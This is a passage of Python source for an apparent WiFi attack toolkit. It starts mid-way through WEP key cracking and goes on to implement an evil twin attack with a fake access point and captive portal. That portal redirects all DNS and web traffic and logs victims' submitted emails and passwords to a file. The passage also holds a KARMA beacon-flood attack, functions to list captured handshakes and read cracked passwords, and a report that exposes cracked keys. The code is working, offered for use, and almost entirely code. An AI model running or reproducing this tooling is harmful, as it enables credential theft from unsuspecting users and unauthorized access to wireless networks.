                )
                if key_match:
                    key = key_match.group(1).replace(
                        ":", ""
                    )

        # Stop all processes
        if inject_proc:
            self._stop_bg(inject_proc)
        self._stop_bg(dump_proc, sig=signal.SIGINT, wait=3)
        self._disable_monitor_mode()

        if key:
            self._append_cracked(
                bssid, "", "WEP", key, "wep"
            )
            logger.info("WEP key cracked for %s: %s",
                        bssid, key)
            return {
                "success": True,
                "bssid": bssid,
                "key": key,
                "duration": int(time.time() - start),
                "capture_file": cap_file
            }

        return {
            "success": False,
            "error": "WEP key not cracked within timeout",
            "bssid": bssid,
            "duration": int(time.time() - start),
            "capture_file": cap_file
            if os.path.exists(cap_file) else None
        }

    @_safe
    def evil_twin(self, ssid, channel, duration=300):
        """Launch an Evil Twin attack with captive portal.

        Creates a fake AP using hostapd, runs dnsmasq for
        DNS/DHCP, sets up iptables for captive portal
        redirect, and starts a simple HTTP credential
        harvester.

        Args:
            ssid: SSID to impersonate.
            channel: WiFi channel to use.
            duration: Seconds to run the attack.

        Returns:
            dict with success, credentials captured.
        """
        self._validate_interface(IFACE)

        if self._evil_twin_running:
            return {
                "success": False,
                "error": "Evil twin already running"
            }

        ts = self._ts()
        work_dir = os.path.join(EVIL_TWIN_DIR, ts)
        os.makedirs(work_dir, exist_ok=True)

        hostapd_conf = os.path.join(
            work_dir, "hostapd.conf"
        )
        dnsmasq_conf = os.path.join(
            work_dir, "dnsmasq.conf"
        )
        cred_log = os.path.join(work_dir, "credentials.log")
        portal_html = os.path.join(work_dir, "portal.html")
        success_html = os.path.join(work_dir, "success.html")

        # Write captive portal HTML
        with open(portal_html, "w") as fh:
            fh.write(CAPTIVE_HTML)
        with open(success_html, "w") as fh:
            fh.write(CAPTIVE_SUCCESS)

        # Write hostapd config
        hostapd_cfg = (
            f"interface={IFACE}\n"
            f"driver=nl80211\n"
            f"ssid={ssid}\n"
            f"hw_mode=g\n"
            f"channel={channel}\n"
            f"wmm_enabled=0\n"
            f"macaddr_acl=0\n"
            f"auth_algs=1\n"
            f"ignore_broadcast_ssid=0\n"
            f"wpa=0\n"
        )
        with open(hostapd_conf, "w") as fh:
            fh.write(hostapd_cfg)

        # Write dnsmasq config
        dnsmasq_cfg = (
            f"interface={IFACE}\n"
            f"dhcp-range=192.168.87.10,"
            f"192.168.87.100,255.255.255.0,12h\n"
            f"dhcp-option=3,192.168.87.1\n"
            f"dhcp-option=6,192.168.87.1\n"
            f"server=8.8.8.8\n"
            f"log-queries\n"
            f"log-dhcp\n"
            f"listen-address=192.168.87.1\n"
            f"address=/#/192.168.87.1\n"
        )
        with open(dnsmasq_conf, "w") as fh:
            fh.write(dnsmasq_cfg)

        # Disable monitor mode if active
        if self._monitor_active:
            self._disable_monitor_mode()

        # Configure interface
        self._run_cmd(
            ["ifconfig", IFACE, "up"], timeout=5
        )
        self._run_cmd(
            ["ifconfig", IFACE, "192.168.87.1",
             "netmask", "255.255.255.0"],
            timeout=5
        )

        # Start hostapd
        hostapd_proc = self._run_cmd_bg(
            ["hostapd", hostapd_conf]
        )
        if hostapd_proc is None:
            return {
                "success": False,
                "error": "hostapd not installed"
            }
        time.sleep(2)

        # Start dnsmasq
        dnsmasq_proc = self._run_cmd_bg(
            [
                "dnsmasq",
                "-C", dnsmasq_conf,
                "--no-daemon"
            ]
        )
        if dnsmasq_proc is None:
            self._stop_bg(hostapd_proc)
            return {
                "success": False,
                "error": "dnsmasq not installed"
            }

        # Setup iptables redirect (port 80 -> portal)
        iptables_rules = [
            [
                "iptables", "-t", "nat", "-A",
                "PREROUTING", "-i", IFACE,
                "-p", "tcp", "--dport", "80",
                "-j", "DNAT",
                "--to-destination", "192.168.87.1:8080"
            ],
            [
                "iptables", "-t", "nat", "-A",
                "PREROUTING", "-i", IFACE,
                "-p", "tcp", "--dport", "443",
                "-j", "DNAT",
                "--to-destination", "192.168.87.1:8080"
            ],
            [
                "iptables", "-A", "FORWARD",
                "-i", IFACE, "-j", "ACCEPT"
            ]
        ]
        for rule in iptables_rules:
            self._run_cmd(rule, timeout=5)

        # Start captive portal HTTP server
        credentials = []
        cred_lock = threading.Lock()

        class PortalHandler(BaseHTTPRequestHandler):
            """Captive portal HTTP request handler."""

            def log_message(self, fmt, *args):
                """Suppress default logging."""
                pass

            def do_GET(self):
                """Serve captive portal page."""
                self.send_response(200)
                self.send_header(
                    "Content-Type", "text/html"
                )
                self.end_headers()
                self.wfile.write(
                    CAPTIVE_HTML.encode("utf-8")
                )

            def do_POST(self):
                """Capture submitted credentials."""
                length = int(
                    self.headers.get("Content-Length", 0)
                )
                body = self.rfile.read(length).decode(
                    "utf-8", errors="replace"
                )

                # Parse form data
                from urllib.parse import parse_qs
                params = parse_qs(body)
                email = params.get("email", [""])[0]
                password = params.get("password", [""])[0]

                if email or password:
                    entry = {
                        "email": email,
                        "password": password,
                        "timestamp":
                            datetime.now().isoformat(),
                        "client_ip": self.client_address[0]
                    }
                    with cred_lock:
                        credentials.append(entry)
                    # Log to file
                    with open(cred_log, "a") as fh:
                        fh.write(
                            f"{entry['timestamp']},"
                            f"{entry['client_ip']},"
                            f"{email},{password}\n"
                        )
                    logger.info(
                        "Evil twin credential captured "
                        "from %s",
                        self.client_address[0]
                    )

                self.send_response(200)
                self.send_header(
                    "Content-Type", "text/html"
                )
                self.end_headers()
                self.wfile.write(
                    CAPTIVE_SUCCESS.encode("utf-8")
                )

        http_server = HTTPServer(
            ("192.168.87.1", 8080), PortalHandler
        )
        http_server.timeout = 1
        self._evil_twin_running = True
        self._evil_twin_server = http_server

        logger.info(
            "Evil twin started: SSID=%s channel=%d "
            "duration=%ds",
            ssid, channel, duration
        )

        # Serve for duration
        start = time.time()
        try:
            while (time.time() - start) < duration:
                http_server.handle_request()
        finally:
            # Cleanup
            self._evil_twin_running = False
            self._evil_twin_server = None
            http_server.server_close()
            self._stop_bg(hostapd_proc)
            self._stop_bg(dnsmasq_proc)

            # Remove iptables rules
            cleanup_rules = [
                [
                    "iptables", "-t", "nat", "-D",
                    "PREROUTING", "-i", IFACE,
                    "-p", "tcp", "--dport", "80",
                    "-j", "DNAT",
                    "--to-destination", "192.168.87.1:8080"
                ],
                [
                    "iptables", "-t", "nat", "-D",
                    "PREROUTING", "-i", IFACE,
                    "-p", "tcp", "--dport", "443",
                    "-j", "DNAT",
                    "--to-destination", "192.168.87.1:8080"
                ],
                [
                    "iptables", "-D", "FORWARD",
                    "-i", IFACE, "-j", "ACCEPT"
                ]
            ]
            for rule in cleanup_rules:
                self._run_cmd(rule, timeout=5)

            # Bring interface down
            self._run_cmd(
                ["ifconfig", IFACE, "down"], timeout=5
            )
            logger.info("Evil twin stopped and cleaned up")

        return {
            "success": True,
            "ssid": ssid,
            "channel": channel,
            "duration": int(time.time() - start),
            "credentials_captured": len(credentials),
            "credentials": credentials,
            "credential_log": cred_log
        }

    @_safe
    def karma_attack(self, duration=300):
        """Run a KARMA attack responding to all probe
        requests.

        Uses mdk4 to broadcast beacon frames for probed
        SSIDs, drawing clients to connect.

        Args:
            duration: Seconds to run attack.

        Returns:
            dict with success status.
        """
        mon_iface = self._enable_monitor_mode()
        ts = self._ts()
        log_file = os.path.join(
            EVIL_TWIN_DIR, f"karma-{ts}.log"
        )

        # Use mdk4 beacon flood mode with probe response
        cmd = [
            "mdk4", mon_iface, "b",
            "-w", "nta",
            "-m"
        ]
        proc = self._run_cmd_bg(cmd, stdout_file=log_file)
        if proc is None:
            # Fallback: try mdk3
            cmd[0] = "mdk3"
            proc = self._run_cmd_bg(
                cmd, stdout_file=log_file
            )
            if proc is None:
                self._disable_monitor_mode()
                return {
                    "success": False,
                    "error": "mdk4/mdk3 not installed"
                }

        logger.info(
            "KARMA attack started for %ds on %s",
            duration, mon_iface
        )

        time.sleep(duration)
        self._stop_bg(proc, sig=signal.SIGINT, wait=3)
        self._disable_monitor_mode()

        # Read log output
        log_content = ""
        if os.path.exists(log_file):
            with open(log_file, "r", errors="replace") as fh:
                log_content = fh.read()

        logger.info("KARMA attack completed")
        return {
            "success": True,
            "duration": duration,
            "log_file": log_file,
            "output_lines": len(
                log_content.strip().splitlines()
            ) if log_content else 0
        }

    @_safe
    def get_handshakes(self):
        """List all captured handshake and PMKID files.

        Returns:
            dict with success, list of capture files with
            metadata (path, size, modified time, type).
        """
        captures = []

        # Handshake .cap files
        if os.path.isdir(HANDSHAKE_DIR):
            for fname in os.listdir(HANDSHAKE_DIR):
                fpath = os.path.join(HANDSHAKE_DIR, fname)
                if not os.path.isfile(fpath):
                    continue
                if not fname.endswith(".cap"):
                    continue
                stat = os.stat(fpath)
                # Extract BSSID from filename
                bssid = ""
                mac_match = re.search(
                    r'([0-9A-Fa-f]{2}-[0-9A-Fa-f]{2}-'
                    r'[0-9A-Fa-f]{2}-[0-9A-Fa-f]{2}-'
                    r'[0-9A-Fa-f]{2}-[0-9A-Fa-f]{2})',
                    fname
                )
                if mac_match:
                    bssid = mac_match.group(1).replace(
                        "-", ":"
                    )
                captures.append({
                    "path": fpath,
                    "filename": fname,
                    "type": "handshake",
                    "bssid": bssid,
                    "size_bytes": stat.st_size,
                    "modified": datetime.fromtimestamp(
                        stat.st_mtime
                    ).isoformat()
                })

        # PMKID .16800 files
        if os.path.isdir(PMKID_DIR):
            for fname in os.listdir(PMKID_DIR):
                fpath = os.path.join(PMKID_DIR, fname)
                if not os.path.isfile(fpath):
                    continue
                if not fname.endswith(".16800"):
                    continue
                stat = os.stat(fpath)
                bssid = ""
                mac_match = re.search(
                    r'([0-9A-Fa-f]{2}-[0-9A-Fa-f]{2}-'
                    r'[0-9A-Fa-f]{2}-[0-9A-Fa-f]{2}-'
                    r'[0-9A-Fa-f]{2}-[0-9A-Fa-f]{2})',
                    fname
                )
                if mac_match:
                    bssid = mac_match.group(1).replace(
                        "-", ":"
                    )
                captures.append({
                    "path": fpath,
                    "filename": fname,
                    "type": "pmkid",
                    "bssid": bssid,
                    "size_bytes": stat.st_size,
                    "modified": datetime.fromtimestamp(
                        stat.st_mtime
                    ).isoformat()
                })

        captures.sort(
            key=lambda x: x["modified"], reverse=True
        )
        logger.info(
            "Found %d capture files", len(captures)
        )
        return {
            "success": True,
            "captures": captures,
            "count": len(captures)
        }

    @_safe
    def get_cracked(self):
        """Read cracked credentials from cracked.csv.

        Returns:
            dict with success, list of cracked credentials.
        """
        if not os.path.exists(CRACKED_CSV):
            return {
                "success": True,
                "credentials": [],
                "count": 0
            }

        creds = []
        with open(CRACKED_CSV, "r", newline="") as fh:
            reader = csv.DictReader(fh)
            for row in reader:
                creds.append({
                    "bssid": row.get("BSSID", ""),
                    "ssid": row.get("SSID", ""),
                    "encryption": row.get(
                        "Encryption", ""
                    ),
                    "password": row.get("Password", ""),
                    "method": row.get("Method", ""),
                    "timestamp": row.get("Timestamp", "")
                })

        logger.info(
            "Loaded %d cracked credentials", len(creds)
        )
        return {
            "success": True,
            "credentials": creds,
            "count": len(creds)
        }

    @_safe
    def security_report(self, bssid=None):
        """Generate a WiFi security assessment report.

        Runs network analysis, cross-references with cracked
        credentials, and produces a summary report.

        Args:
            bssid: Optional specific BSSID to report on.

        Returns:
            dict with success, report data.
        """
        ts = self._ts()
        report_file = os.path.join(
            REPORTS_DIR, f"report-{ts}.csv"
        )

        # Scan networks
        scan_result = self.analyze_networks(
            target_bssid=bssid, scan_duration=20
        )
        if not scan_result.get("success"):
            return {
                "success": False,
                "error": "Network scan failed: "
                         + scan_result.get("error", "unknown")
            }

        networks = scan_result.get("networks", [])

        # Get cracked data
        cracked_result = self.get_cracked()
        cracked_map = {}
        if cracked_result.get("success"):
            for cred in cracked_result.get(
                "credentials", []
            ):
                cracked_map[cred["bssid"].upper()] = cred

        # Build assessment
        assessments = []
        vuln_count = 0
        cracked_count = 0

        for net in networks:
            net_bssid = net["bssid"].upper()
            enc = net.get("encryption", "").upper()

            risk_level = "LOW"
            vulnerabilities = []

            # Check encryption strength
            if "OPN" in enc or enc == "" or "OPEN" in enc:
                risk_level = "CRITICAL"
                vulnerabilities.append("Open network (no encryption)")
            elif "WEP" in enc:
                risk_level = "CRITICAL"
                vulnerabilities.append(
                    "WEP encryption (easily crackable)"
                )
            elif "WPA" in enc and "WPA2" not in enc \
                    and "WPA3" not in enc:
                risk_level = "HIGH"
                vulnerabilities.append(
                    "WPA1 (deprecated, weak)"
                )
            elif "WPA2" in enc and "WPA3" not in enc:
                risk_level = "MEDIUM"

            if net.get("wps_enabled"):
                if risk_level in ("LOW", "MEDIUM"):
                    risk_level = "HIGH"
                vulnerabilities.append(
                    "WPS enabled (Pixie Dust / brute force)"
                )

            if net.get("hidden"):
                vulnerabilities.append(
                    "Hidden SSID (security through obscurity)"
                )

            is_cracked = net_bssid in cracked_map
            if is_cracked:
                risk_level = "CRITICAL"
                vulnerabilities.append(
                    "Password has been cracked"
                )
                cracked_count += 1

            if vulnerabilities:
                vuln_count += 1

            assessment = {
                "bssid": net["bssid"],
                "ssid": net.get("ssid", ""),
                "channel": net.get("channel", 0),
                "encryption": net.get("encryption", ""),
                "signal": net.get("signal", -1),
                "wps_enabled": net.get("wps_enabled", False),
                "hidden": net.get("hidden", False),
                "clients_count": net.get(
                    "clients_count", 0
                ),
                "risk_level": risk_level,
                "vulnerabilities": vulnerabilities,
                "is_cracked": is_cracked,
                "cracked_password":
                    cracked_map[net_bssid]["password"]
                    if is_cracked else None
            }
            assessments.append(assessment)

        # Sort by risk: CRITICAL > HIGH > MEDIUM > LOW
        risk_order = {
            "CRITICAL": 0, "HIGH": 1,
            "MEDIUM": 2, "LOW": 3
        }
        assessments.sort(
            key=lambda a: risk_order.get(
                a["risk_level"], 99
            )
        )

        # Write report CSV
        if assessments:
            csv_fields = [
                "bssid", "ssid", "channel", "encryption",
                "signal", "wps_enabled", "hidden",
                "clients_count", "risk_level",
                "vulnerabilities", "is_cracked"
            ]
            with open(report_file, "w", newline="") as fh:
                writer = csv.DictWriter(
                    fh, fieldnames=csv_fields,
                    extrasaction="ignore"
                )
                writer.writeheader()
                for item in assessments:
                    row = dict(item)
                    row["vulnerabilities"] = "; ".join(
                        row["vulnerabilities"]
                    )
                    writer.writerow(row)

        # Summary stats
        enc_counts = {}
        for net in networks:
            enc = net.get("encryption", "Unknown")
            enc_counts[enc] = enc_counts.get(enc, 0) + 1

        summary = {
            "total_networks": len(networks),
            "vulnerable_networks": vuln_count,
            "cracked_networks": cracked_count,
            "encryption_distribution": enc_counts,
            "risk_distribution": {}
        }
        for item in assessments:
            rl = item["risk_level"]
            summary["risk_distribution"][rl] = \
                summary["risk_distribution"].get(rl, 0) + 1

        logger.info(
            "Security report generated: %d networks, "
            "%d vulnerable, %d cracked",
            len(networks), vuln_count, cracked_count
        )

        return {
            "success": True,
            "summary": summary,
            "assessments": assessments,
            "report_file": report_file,
            "timestamp": datetime.now().isoformat()
        }


# Module-level singleton
wifi_mgr = WiFiManager()
